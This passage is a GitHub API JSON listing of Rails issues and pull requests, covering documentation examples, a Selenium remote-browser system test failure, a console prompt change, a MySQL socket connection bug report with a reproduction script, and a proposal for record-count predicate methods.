        "body": "### Detail\r\n\r\nThis Pull Request add examples for `FormTagHelper` methods.\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50828/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50828/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50827",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50827/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50827/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50827/events",
        "html_url": "https://github.com/rails/rails/issues/50827",
        "id": 2092292151,
        "node_id": "I_kwDNIULOfLXYNw",
        "number": 50827,
        "title": "System tests not working on Rails 7.1.3 running on a remote machine/docker container.",
        "user": {
            "login": "srabuini",
            "id": 286604,
            "node_id": "MDQ6VXNlcjI4NjYwNA==",
            "avatar_url": "https://avatars.githubusercontent.com/u/286604?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/srabuini",
            "html_url": "https://github.com/srabuini",
            "followers_url": "https://api.github.com/users/srabuini/followers",
            "following_url": "https://api.github.com/users/srabuini/following{/other_user}",
            "gists_url": "https://api.github.com/users/srabuini/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/srabuini/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/srabuini/subscriptions",
            "organizations_url": "https://api.github.com/users/srabuini/orgs",
            "repos_url": "https://api.github.com/users/srabuini/repos",
            "events_url": "https://api.github.com/users/srabuini/events{/privacy}",
            "received_events_url": "https://api.github.com/users/srabuini/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 4,
        "created_at": "2024-01-21T00:44:06Z",
        "updated_at": "2024-01-30T12:48:39Z",
        "closed_at": null,
        "author_association": "NONE",
        "active_lock_reason": null,
        "body": "### Steps to reproduce\r\n\r\nI've been running my system tests using a remote browser (on a docker container) since Rails 7.0 without a problem, with the following set up.\r\n\r\n<!-- Paste your executable test case created from one of the scripts found [here](https://edgeguides.rubyonrails.org/contributing_to_ruby_on_rails.html#create-an-executable-test-case) below: -->\r\n```ruby\r\nclass ApplicationSystemTestCase < ActionDispatch::SystemTestCase\r\n  driven_by :selenium,\r\n            using: :chrome,\r\n            screen_size: [1400, 1400],\r\n            options: { browser: :remote,\r\n                       url: 'http://chrome-server:4444' } do |driver_option|\r\n    driver_option.add_argument 'disable-dev-shm-usage'\r\n  end\r\n```\r\n\r\nIt looks like the problem was introduced in #49908 and related issues/fixes.\r\n\r\nI fixed it locally just monkeypatching `Selenium::Webdriver::DriverFinder.path` just to return nil.\r\n\r\nHaving a look at the code, I think that it would be nice to avoid `Browser#preload` when browser is `:remote` in:\r\n\r\nhttps://github.com/rails/rails/blob/3064d4f53a48beb107a549a2249820350e698050/actionpack/lib/action_dispatch/system_testing/driver.rb#L19\r\n\r\nIf you think it's the right way to tackle it, I could post a fix.\r\n\r\n### Actual behavior\r\nAfter a while, an exception is raised:\r\n\r\n```\r\nSelenium::WebDriver::Error::SessionNotCreatedError: Could not start a new session. Error while creating session with the driver service. Stopping driver service: Could not start a new session. Response code 500. Message: unknown error: no chrome binary at /root/.cache/selenium/chrome/linux64/120.0.6099.109/chrome \r\nHost info: host: 'c3260b1b08ce', ip: '192.168.16.3'\r\nBuild info: version: '4.10.0', revision: 'c14d967899'\r\nSystem info: os.name: 'Linux', os.arch: 'aarch64', os.version: '6.5.11-linuxkit', java.version: '11.0.18'\r\nDriver info: driver.version: unknown\r\nBuild info: version: '4.10.0', revision: 'c14d967899'\r\nSystem info: os.name: 'Linux', os.arch: 'aarch64', os.version: '6.5.11-linuxkit', java.version: '11.0.18'\r\nDriver info: driver.version: unknown\r\n    [remote server] org.openqa.selenium.grid.node.config.DriverServiceSessionFactory(DriverServiceSessionFactory.java):210:in `apply'\r\n    [remote server] org.openqa.selenium.grid.node.config.DriverServiceSessionFactory(DriverServiceSessionFactory.java):69:in `apply'\r\n    [remote server] org.openqa.selenium.grid.node.local.SessionSlot(SessionSlot.java):147:in `apply'\r\n    [remote server] org.openqa.selenium.grid.node.local.LocalNode(LocalNode.java):467:in `newSession'\r\n    [remote server] org.openqa.selenium.grid.distributor.local.LocalDistributor(LocalDistributor.java):643:in `startSession'\r\n    [remote server] org.openqa.selenium.grid.distributor.local.LocalDistributor(LocalDistributor.java):560:in `newSession'\r\n    [remote server] org.openqa.selenium.grid.distributor.local.LocalDistributor$NewSessionRunnable(LocalDistributor.java):814:in `handleNewSessionRequest'\r\n    [remote server] org.openqa.selenium.grid.distributor.local.LocalDistributor$NewSessionRunnable(LocalDistributor.java):773:in `lambda$run$1'\r\n    [remote server] java.util.concurrent.ThreadPoolExecutor(ThreadPoolExecutor.java):1128:in `runWorker'\r\n    [remote server] java.util.concurrent.ThreadPoolExecutor$Worker(ThreadPoolExecutor.java):628:in `run'\r\n    [remote server] java.lang.Thread(Thread.java):829:in `run'\r\n    /usr/local/bundle/ruby/3.2.0/gems/selenium-webdriver-4.16.0/lib/selenium/webdriver/remote/response.rb:55:in `assert_ok'\r\n    /usr/local/bundle/ruby/3.2.0/gems/selenium-webdriver-4.16.0/lib/selenium/webdriver/remote/response.rb:34:in `initialize'\r\n    /usr/local/bundle/ruby/3.2.0/gems/selenium-webdriver-4.16.0/lib/selenium/webdriver/remote/http/common.rb:83:in `new'\r\n    /usr/local/bundle/ruby/3.2.0/gems/selenium-webdriver-4.16.0/lib/selenium/webdriver/remote/http/common.rb:83:in `create_response'\r\n    /usr/local/bundle/ruby/3.2.0/gems/selenium-webdriver-4.16.0/lib/selenium/webdriver/remote/http/default.rb:103:in `request'\r\n    /usr/local/bundle/ruby/3.2.0/gems/selenium-webdriver-4.16.0/lib/selenium/webdriver/remote/http/common.rb:59:in `call'\r\n    /usr/local/bundle/ruby/3.2.0/gems/selenium-webdriver-4.16.0/lib/selenium/webdriver/remote/bridge.rb:601:in `execute'\r\n    /usr/local/bundle/ruby/3.2.0/gems/selenium-webdriver-4.16.0/lib/selenium/webdriver/remote/bridge.rb:53:in `create_session'\r\n    /usr/local/bundle/ruby/3.2.0/gems/selenium-webdriver-4.16.0/lib/selenium/webdriver/common/driver.rb:317:in `block in create_bridge'\r\n    <internal:kernel>:90:in `tap'\r\n    /usr/local/bundle/ruby/3.2.0/gems/selenium-webdriver-4.16.0/lib/selenium/webdriver/common/driver.rb:316:in `create_bridge'\r\n    /usr/local/bundle/ruby/3.2.0/gems/selenium-webdriver-4.16.0/lib/selenium/webdriver/common/driver.rb:74:in `initialize'\r\n    /usr/local/bundle/ruby/3.2.0/gems/selenium-webdriver-4.16.0/lib/selenium/webdriver/remote/driver.rb:38:in `initialize'\r\n    /usr/local/bundle/ruby/3.2.0/gems/selenium-webdriver-4.16.0/lib/selenium/webdriver/common/driver.rb:57:in `new'\r\n    /usr/local/bundle/ruby/3.2.0/gems/selenium-webdriver-4.16.0/lib/selenium/webdriver/common/driver.rb:57:in `for'\r\n    /usr/local/bundle/ruby/3.2.0/gems/selenium-webdriver-4.16.0/lib/selenium/webdriver.rb:89:in `for'\r\n    /usr/local/bundle/ruby/3.2.0/gems/capybara-3.39.2/lib/capybara/selenium/driver.rb:83:in `browser'\r\n    /usr/local/bundle/ruby/3.2.0/gems/actionpack-7.1.3/lib/action_dispatch/system_testing/driver.rb:55:in `block in register_selenium'\r\n    <internal:kernel>:90:in `tap'\r\n    /usr/local/bundle/ruby/3.2.0/gems/actionpack-7.1.3/lib/action_dispatch/system_testing/driver.rb:54:in `register_selenium'\r\n    /usr/local/bundle/ruby/3.2.0/gems/actionpack-7.1.3/lib/action_dispatch/system_testing/driver.rb:41:in `block in register'\r\n    /usr/local/bundle/ruby/3.2.0/gems/capybara-3.39.2/lib/capybara/session.rb:105:in `driver'\r\n    /usr/local/bundle/ruby/3.2.0/gems/capybara-3.39.2/lib/capybara/session.rb:91:in `initialize'\r\n    /usr/local/bundle/ruby/3.2.0/gems/capybara-3.39.2/lib/capybara.rb:421:in `new'\r\n    /usr/local/bundle/ruby/3.2.0/gems/capybara-3.39.2/lib/capybara.rb:421:in `block in session_pool'\r\n    /usr/local/bundle/ruby/3.2.0/gems/capybara-3.39.2/lib/capybara.rb:317:in `current_session'\r\n    /usr/local/bundle/ruby/3.2.0/gems/capybara-3.39.2/lib/capybara/dsl.rb:46:in `page'\r\n    /usr/local/bundle/ruby/3.2.0/gems/actionpack-7.1.3/lib/action_dispatch/system_testing/test_helpers/screenshot_helper.rb:106:in `save_image'\r\n    /usr/local/bundle/ruby/3.2.0/gems/actionpack-7.1.3/lib/action_dispatch/system_testing/test_helpers/screenshot_helper.rb:36:in `take_screenshot'\r\n    /usr/local/bundle/ruby/3.2.0/gems/actionpack-7.1.3/lib/action_dispatch/system_testing/test_helpers/screenshot_helper.rb:47:in `take_failed_screenshot'\r\n    /usr/local/bundle/ruby/3.2.0/gems/actionpack-7.1.3/lib/action_dispatch/system_testing/test_helpers/setup_and_teardown.rb:8:in `before_teardown'\r\n```\r\n\r\n### System configuration\r\n**Rails version**: 7.1..3\r\n\r\n**Ruby version**: 3.2.2 (2023-03-30 revision e51014f9c0) [aarch64-linux]\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50827/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50827/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50826",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50826/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50826/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50826/events",
        "html_url": "https://github.com/rails/rails/pull/50826",
        "id": 2092286908,
        "node_id": "PR_kwDNIULOZKMR9Q",
        "number": 50826,
        "title": "[docs] Add more examples to `#in_order_of` [ci-skip]",
        "user": {
            "login": "thdaraujo",
            "id": 707418,
            "node_id": "MDQ6VXNlcjcwNzQxOA==",
            "avatar_url": "https://avatars.githubusercontent.com/u/707418?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/thdaraujo",
            "html_url": "https://github.com/thdaraujo",
            "followers_url": "https://api.github.com/users/thdaraujo/followers",
            "following_url": "https://api.github.com/users/thdaraujo/following{/other_user}",
            "gists_url": "https://api.github.com/users/thdaraujo/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/thdaraujo/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/thdaraujo/subscriptions",
            "organizations_url": "https://api.github.com/users/thdaraujo/orgs",
            "repos_url": "https://api.github.com/users/thdaraujo/repos",
            "events_url": "https://api.github.com/users/thdaraujo/events{/privacy}",
            "received_events_url": "https://api.github.com/users/thdaraujo/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2024-01-21T00:21:26Z",
        "updated_at": "2024-01-31T16:16:51Z",
        "closed_at": null,
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50826",
            "html_url": "https://github.com/rails/rails/pull/50826",
            "diff_url": "https://github.com/rails/rails/pull/50826.diff",
            "patch_url": "https://github.com/rails/rails/pull/50826.patch",
            "merged_at": null
        },
        "body": "### Motivation / Background\r\n\r\n`#in_order_of` is an excellent method and makes ordering enum columns easier, and many complex order case/when queries can be refactored to use it.\r\n\r\nThis PR was created because I believe having more examples would help people understand this method a bit better.\r\n\r\nAlso, I think it's useful to document that this method will order results, but also FILTER them, excluding rows in which the column doesn't match any of the given values.\r\n\r\nSo I expanded the description and added these examples:\r\n- what happens when dealing with `enum` +columns+\r\n- what happens when passing `nil` as a +value+ for nullable columns\r\n\r\nHere's a gist with some tests: https://gist.github.com/thdaraujo/7d9aa5ffd1b61bf57604ded14535e357\r\n\r\nI'd be happy to add other examples for other usecases you think are relevant, just let me know!\r\n\r\n### Detail\r\n\r\nThis Pull Request expands the documentation for [in_order_of](https://api.rubyonrails.org/classes/ActiveRecord/QueryMethods.html#method-i-in_order_of)\r\n\r\n### Additional information\r\n\r\nn/a\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* ~[ ] Tests are added or updated if you fix a bug or add a feature.~ not applicable\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50826/reactions",
            "total_count": 4,
            "+1": 2,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 2,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50826/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50825",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50825/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50825/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50825/events",
        "html_url": "https://github.com/rails/rails/pull/50825",
        "id": 2092237688,
        "node_id": "PR_kwDNIULOZKJ7oA",
        "number": 50825,
        "title": "Update rails console prompt",
        "user": {
            "login": "st0012",
            "id": 5079556,
            "node_id": "MDQ6VXNlcjUwNzk1NTY=",
            "avatar_url": "https://avatars.githubusercontent.com/u/5079556?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/st0012",
            "html_url": "https://github.com/st0012",
            "followers_url": "https://api.github.com/users/st0012/followers",
            "following_url": "https://api.github.com/users/st0012/following{/other_user}",
            "gists_url": "https://api.github.com/users/st0012/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/st0012/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/st0012/subscriptions",
            "organizations_url": "https://api.github.com/users/st0012/orgs",
            "repos_url": "https://api.github.com/users/st0012/repos",
            "events_url": "https://api.github.com/users/st0012/events{/privacy}",
            "received_events_url": "https://api.github.com/users/st0012/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107195,
                "node_id": "MDU6TGFiZWwxMDcxOTU=",
                "url": "https://api.github.com/repos/rails/rails/labels/railties",
                "name": "railties",
                "color": "8BE06E",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 6,
        "created_at": "2024-01-20T20:57:22Z",
        "updated_at": "2024-01-21T00:04:21Z",
        "closed_at": "2024-01-20T23:36:25Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50825",
            "html_url": "https://github.com/rails/rails/pull/50825",
            "diff_url": "https://github.com/rails/rails/pull/50825.diff",
            "patch_url": "https://github.com/rails/rails/pull/50825.patch",
            "merged_at": "2024-01-20T23:36:25Z"
        },
        "body": "### Motivation / Background\r\n\r\nThis PR adopts the follow up suggestion in https://github.com/rails/rails/issues/50770 around Rails console's prompt.\r\n\r\n### Detail\r\n\r\nInstead of displaying `[env]:[line-number]>` as the prompt, showing `[app-name]([env])>` will provide more value to users.\r\n\r\nFor example, if the app's top-level module is `MyApp`, its development prompt would be:\r\n\r\n```\r\nmy-app(dev)>\r\n```\r\n\r\n### Additional information\r\n\r\n<!-- Provide additional information such as benchmarks, reference to other repositories or alternative solutions. -->\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50825/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50825/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50824",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50824/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50824/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50824/events",
        "html_url": "https://github.com/rails/rails/issues/50824",
        "id": 2092163791,
        "node_id": "I_kwDNIULOfLPizw",
        "number": 50824,
        "title": "ActiveRecord - MySQL adapter -  Can't connect to local server through socket when `localhost` is specified on connection settings.",
        "user": {
            "login": "ruyrocha",
            "id": 108208,
            "node_id": "MDQ6VXNlcjEwODIwOA==",
            "avatar_url": "https://avatars.githubusercontent.com/u/108208?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/ruyrocha",
            "html_url": "https://github.com/ruyrocha",
            "followers_url": "https://api.github.com/users/ruyrocha/followers",
            "following_url": "https://api.github.com/users/ruyrocha/following{/other_user}",
            "gists_url": "https://api.github.com/users/ruyrocha/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/ruyrocha/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/ruyrocha/subscriptions",
            "organizations_url": "https://api.github.com/users/ruyrocha/orgs",
            "repos_url": "https://api.github.com/users/ruyrocha/repos",
            "events_url": "https://api.github.com/users/ruyrocha/events{/privacy}",
            "received_events_url": "https://api.github.com/users/ruyrocha/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 2,
        "created_at": "2024-01-20T17:11:07Z",
        "updated_at": "2024-01-30T20:13:58Z",
        "closed_at": "2024-01-30T18:54:25Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "body": "### Steps to reproduce\r\nI'm running a local MariaDB server container on _localhost_ and it's configured to allow root logins without a password. \r\n\r\nIndeed the exception message (`Can't connect to local server through socket`) is right as it's not possible to connect to the MySQL server variant through the socket on `/var/lib/mysql/mysql.sock`, and it happens as the MySQL client library for the gem `mysql2` translates `localhost` to a local UNIX socket.\r\n\r\nIt's fine if I use the `trilogy` adapter to connect to it instead of the `mysql2` one.\r\n\r\nI can use the `mysql2` adapter if I change the host to IP address (`127.0.0.1`) on connection settings, but this may not be too obvious.\r\n\r\n<!-- (Guidelines for creating a bug report are [available\r\nhere](https://edgeguides.rubyonrails.org/contributing_to_ruby_on_rails.html#creating-a-bug-report)) -->\r\n\r\n<!-- Paste your executable test case created from one of the scripts found [here](https://edgeguides.rubyonrails.org/contributing_to_ruby_on_rails.html#create-an-executable-test-case) below: -->\r\n```ruby\r\nrequire \"bundler/inline\"\r\n\r\ngemfile(true) do\r\n  source \"https://rubygems.org\"\r\n\r\n  git_source(:github) { |repo| \"https://github.com/#{repo}.git\" }\r\n\r\n  # Activate the gem you are reporting the issue against.\r\n  gem \"rails\", github: \"rails/rails\", branch: \"main\"\r\n\r\n  gem \"mysql2\"\r\n  gem \"trilogy\"\r\nend\r\n\r\nrequire \"active_record\"\r\nrequire \"minitest/autorun\"\r\nrequire \"logger\"\r\n\r\n# MariaDB server is already running and allowing root connections without\r\n# a password to localhost (127.0.0.1) on default port 3306.\r\nDATABASE_NAME = 'buggy_adapter_test'\r\n\r\nDEFAULT_DATABASE_OPTIONS = { \r\n  username: 'root',\r\n  password: '',\r\n  host: 'localhost',\r\n  database: DATABASE_NAME\r\n}\r\n\r\nDB_CONNECTION_OPTIONS = { \r\n  trilogy: DEFAULT_DATABASE_OPTIONS.merge(adapter: :trilogy),\r\n  mysql2: DEFAULT_DATABASE_OPTIONS.merge(adapter: :mysql2),\r\n}\r\n\r\nActiveRecord::Base.logger = Logger.new(STDOUT)\r\n\r\nclass BugTest < ActiveSupport::TestCase\r\n  def trilogy_adapter_connection_settings\r\n    DB_CONNECTION_OPTIONS[:trilogy]\r\n  end\r\n\r\n  def mysql2_adapter_connection_settings\r\n    DB_CONNECTION_OPTIONS[:mysql2]\r\n  end\r\n\r\n  def recreate_database(database_name)\r\n    ActiveRecord::Base.connection.drop_database(database_name) rescue nil\r\n    ActiveRecord::Base.connection.create_database(database_name)\r\n  end\r\n\r\n  def connect_to_server_and_create_database_for(config)\r\n    ActiveRecord::Base.establish_connection(config.except(:database))\r\n\r\n    recreate_database(config[:database])\r\n\r\n    ActiveRecord::Base.establish_connection(config)\r\n  end\r\n\r\n  def test_database_connection_using_trilogy_adapter\r\n    assert_nothing_raised do\r\n      connect_to_server_and_create_database_for(trilogy_adapter_connection_settings)\r\n\r\n      ActiveRecord::Schema.define { create_table :articles, force: true }\r\n    end\r\n  end\r\n\r\n  def test_database_connection_using_mysql_adapter\r\n    assert_nothing_raised do\r\n      connect_to_server_and_create_database_for(mysql2_adapter_connection_settings)\r\n\r\n      ActiveRecord::Schema.define { create_table :articles, force: true }\r\n    end\r\n  end\r\nend\r\n```\r\n\r\n### Expected behavior\r\nContainers are a reality, so I'm expecting at least a better error message when using the MySQL adapter for servers running on `localhost`.\r\n\r\nI may be wrong but I didn't see anything on docs about it.\r\n\r\nAlso, is Trilogy being advocate as the default MySQL adapter for Rails?\r\n\r\n### Actual behavior\r\n```ruby\r\nFetching https://github.com/rails/rails.git\r\nFetching gem metadata from https://rubygems.org/..........\r\nResolving dependencies...\r\nRun options: --seed 62618\r\n\r\n# Running:\r\n\r\nD, [2024-01-20T13:19:17.271879 #28337] DEBUG -- :    (9.8ms)  DROP DATABASE IF EXISTS `buggy_adapter_test`\r\nD, [2024-01-20T13:19:17.272136 #28337] DEBUG -- :    (0.2ms)  CREATE DATABASE `buggy_adapter_test` DEFAULT CHARACTER SET `utf8mb4`\r\n-- create_table(:articles, {:force=>true})\r\nD, [2024-01-20T13:19:17.276607 #28337] DEBUG -- :    (0.7ms)  DROP TABLE IF EXISTS `articles`\r\nD, [2024-01-20T13:19:17.277828 #28337] DEBUG -- :    (1.1ms)  CREATE TABLE `articles` (`id` bigint NOT NULL AUTO_INCREMENT PRIMARY KEY)\r\n   -> 0.0052s\r\nD, [2024-01-20T13:19:17.280845 #28337] DEBUG -- :    (1.1ms)  CREATE TABLE `schema_migrations` (`version` varchar(255) NOT NULL PRIMARY KEY)\r\nD, [2024-01-20T13:19:17.282667 #28337] DEBUG -- :    (1.1ms)  CREATE TABLE `ar_internal_metadata` (`key` varchar(255) NOT NULL PRIMARY KEY, `value` varchar(255), `created_at` datetime(6) NOT NULL, `updated_at` datetime(6) NOT NULL)\r\nD, [2024-01-20T13:19:17.293672 #28337] DEBUG -- :   ActiveRecord::InternalMetadata Load (0.7ms)  SELECT * FROM `ar_internal_metadata` WHERE `ar_internal_metadata`.`key` = 'environment' ORDER BY `ar_internal_metadata`.`key` ASC LIMIT 1\r\nD, [2024-01-20T13:19:17.294896 #28337] DEBUG -- :   ActiveRecord::InternalMetadata Create (1.1ms)  INSERT INTO `ar_internal_metadata` (`key`, `value`, `created_at`, `updated_at`) VALUES ('environment', 'development', '2024-01-20 16:19:17.293710', '2024-01-20 16:19:17.293712') RETURNING `key`\r\n.D, [2024-01-20T13:19:17.396786 #28337] DEBUG -- :    (100.6ms)  DROP DATABASE IF EXISTS `buggy_adapter_test`\r\nE\r\n\r\nError:\r\nBugTest#test_database_connection_using_mysql_adapter:\r\nActiveRecord::ConnectionNotEstablished: Can't connect to local server through socket '/var/lib/mysql/mysql.sock' (2)\r\n```\r\n<!-- Tell us what happens instead -->\r\n\r\n### System configuration\r\n**Rails version**: **main branch** (7.2.0.alpha)\r\n\r\n**Ruby version**: 3.2.3\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50824/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50824/timeline",
        "performed_via_github_app": null,
        "state_reason": "not_planned"
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50823",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50823/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50823/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50823/events",
        "html_url": "https://github.com/rails/rails/pull/50823",
        "id": 2092154145,
        "node_id": "PR_kwDNIULOZKF0tA",
        "number": 50823,
        "title": "Add methods to `ActiveRecord::Relation::FinderMethods` to determine if it contains exactly/more than/less than N records",
        "user": {
            "login": "jordinl",
            "id": 16135423,
            "node_id": "MDQ6VXNlcjE2MTM1NDIz",
            "avatar_url": "https://avatars.githubusercontent.com/u/16135423?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/jordinl",
            "html_url": "https://github.com/jordinl",
            "followers_url": "https://api.github.com/users/jordinl/followers",
            "following_url": "https://api.github.com/users/jordinl/following{/other_user}",
            "gists_url": "https://api.github.com/users/jordinl/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/jordinl/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/jordinl/subscriptions",
            "organizations_url": "https://api.github.com/users/jordinl/orgs",
            "repos_url": "https://api.github.com/users/jordinl/repos",
            "events_url": "https://api.github.com/users/jordinl/events{/privacy}",
            "received_events_url": "https://api.github.com/users/jordinl/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 10,
        "created_at": "2024-01-20T16:56:20Z",
        "updated_at": "2024-02-01T14:30:49Z",
        "closed_at": null,
        "author_association": "NONE",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50823",
            "html_url": "https://github.com/rails/rails/pull/50823",
            "diff_url": "https://github.com/rails/rails/pull/50823.diff",
            "patch_url": "https://github.com/rails/rails/pull/50823.patch",
            "merged_at": null
        },
        "body": "### Motivation / Background\r\n\r\nI've had to check in a few places if a relation had exactly or less than or more than N records. On top of that, if the collection contains a lot of records, counting on the entire collection not only is slower but also unnecessary and limiting the count the first N or N+1 records is sufficient and faster.\r\n\r\n### Detail\r\n\r\nAdds the following methods to `ActiveRecord::Relation::FinderMethods`:\r\n  * `exactly?` returns true if the relation contains exactly N records, false otherwise.\r\n  * `at_least?` returns true if the relation contains at least N records, false otherwise.\r\n  * `at_most?` returns true if the relation contains at most N records, false otherwise.\r\n  * `less_than?` returns true if the relation contains less than N records, false otherwise.\r\n  * `more_than?` returns true if the relation contains more than N records, false otherwise.\r\n\r\nThese methods perform a `limit(M).count` (where M = N or N + 1) under the hood.\r\n\r\n### Additional information\r\n\r\nI think the naming of these methods is fine as is. Don't know if others would prefer to prefix these with `has_` or `contains_`, ie `has_exactly?` or `contains_exactly?`.\r\n\r\nWith regards to performance of doing the count with and without the limit. Without the limit when there are 8M records I get:\r\n\r\n```sql\r\n  Referral Count (135.2ms)  SELECT COUNT(*) FROM \"referrals\" WHERE \"referrals\".\"company_id\" = $1  [[\"company_id\", \"29f1dfa2-01d0-4e5d-b482-7aa1f3ba7535\"]]\r\n=> 8467786\r\n```\r\n\r\nWith a limit of a 100:\r\n\r\n```sql\r\n  Referral Count (0.4ms)  SELECT COUNT(*) FROM (SELECT 1 AS one FROM \"referrals\" WHERE 